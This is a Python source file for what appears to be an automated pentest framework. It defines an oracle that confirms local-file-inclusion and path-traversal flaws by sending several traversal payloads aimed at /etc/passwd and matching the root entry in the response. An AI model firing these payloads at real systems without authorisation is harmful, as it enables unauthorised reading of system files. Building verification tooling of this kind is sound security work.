"""LFI / path-traversal impact oracle — proves file *read*, not just a signal.

Where the reflected-XSS/redirect oracles confirm a precondition, this proves
actual impact: it retrieves a known-existing system file and confirms a
deterministic signature of that file in the response. Reading ``/etc/passwd`` and
matching ``root:...:0:0:`` is undeniable proof the input reaches a file-read sink
— the difference between "maybe traversal" and "confirmed arbitrary file read".

Still confirmation, not weaponisation: it reads one bounded, well-known file to
prove the capability and matches only its public signature — it never exfiltrates
target data (weaponising the read stays behind the human gate). Works for a
parameter-based LFI (``?file=…``) or a path-based traversal (``/../../etc/passwd``).
"""

from __future__ import annotations

import re
from typing import Any

from ...schemas.findings import Finding
from ...schemas.tools import ToolProfile
from ...toolrunner.wrappers.http_probe import HttpProbeWrapper
from ..context import VerifyContext
from .base import Oracle, OracleResult

#: Signature of /etc/passwd — the canonical, always-present proof file. The root
#: entry (uid/gid 0) is stable across distros and safe to match on (public).
_PASSWD_SIGNATURE = re.compile(rb"root:.*:0:0:")

#: Traversal payloads tried in order. None contain shell metacharacters, so they
#: pass the Tool Runner's argument guard cleanly.
_DEFAULT_PAYLOADS: tuple[str, ...] = (
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd",
)


class LfiFileReadOracle(Oracle):
    oracle_id = "lfi_file_read_oracle_v1"

    def handles(self, finding: Finding) -> bool:
        return finding.type.startswith(("lfi", "path-traversal", "file-read"))

    def verify(self, finding: Finding, ctx: VerifyContext) -> OracleResult:
        md = finding.metadata
        param = md.get("param")
        payloads = tuple(md.get("payloads") or _DEFAULT_PAYLOADS)
        signature = (
            re.compile(str(md["signature"]).encode())
            if md.get("signature")
            else _PASSWD_SIGNATURE
        )
        method = str(md.get("method", "GET")).upper()
        base_args: dict[str, Any] = {
            "scheme": md.get("scheme", "http"),
            "port": md.get("port"),
        }
        evidence: list[str] = []

        for payload in payloads:
            args = self._args_for(base_args, md, param, method, payload)
            result = ctx.tool_runner.run("http_probe", finding.asset, ToolProfile(args=args))
            evidence.append(f"raw:{result.audit_id}")
            body = HttpProbeWrapper.body_of(result.raw)
            if signature.search(body):
                return OracleResult(
                    passed=True,
                    oracle_id=self.oracle_id,
                    detail=(
                        f"read target file via payload {payload!r} "
                        f"(status {result.parsed.get('status')}); file signature matched"
                    ),
                    confidence=0.98,
                    evidence=tuple(evidence),
                    measurements={"technique": "file-read", "payload": payload},
                )

        return OracleResult(
            passed=False,
            oracle_id=self.oracle_id,
            detail=f"no target-file signature in any of {len(payloads)} traversal responses",
            evidence=tuple(evidence),
        )

    @staticmethod
    def _args_for(
        base_args: dict[str, Any],
        md: dict[str, Any],
        param: object,
        method: str,
        payload: str,
    ) -> dict[str, Any]:
        """Put the payload in the parameter (LFI) or the URL path (traversal)."""

        if param:
            key = "data" if method in ("POST", "PUT") else "params"
            return {**base_args, "path": md.get("path", "/"), "method": method,
                    key: {str(param): payload}}
        return {**base_args, "path": payload, "method": method}
